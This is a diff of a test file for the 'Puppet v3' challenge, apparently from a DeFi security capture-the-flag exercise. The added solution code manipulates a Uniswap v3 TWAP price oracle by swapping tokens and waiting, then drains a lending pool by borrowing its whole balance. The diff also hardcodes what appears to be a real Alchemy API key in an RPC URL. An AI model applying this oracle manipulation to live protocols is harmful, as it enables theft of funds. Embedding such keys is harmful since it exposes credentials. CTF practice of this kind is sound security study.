@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/5XD2QGS0s776xCOEY0ImstI8pR5CKfSj";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -139,7 +139,26 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const PuppetV3Attacker = await ethers.getContractFactory('P3Attacker');
+        const puppetV3Attacker = await PuppetV3Attacker.deploy( token.address,uniswapPool.address, lendingPool.address, weth.address);
+        await token.connect(player).transfer(puppetV3Attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // swap DVT for WETH
+        await puppetV3Attacker.callSwap(ethers.utils.parseEther("109"),{gasLimit:3000000})
+        await time.increase(100);
+        
+        // transfer WETH to lending pool
+        await puppetV3Attacker.connect(player).transferWeth();
+        await weth
+        .connect(player)
+        .approve(lendingPool.address, ethers.utils.parseEther("99"));
+
+        await lendingPool
+        .connect(player)
+        .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+         // Check the pool status for references
+        await puppetV3Attacker.observePool([600, 0]);
     });
 
     after(async function () {
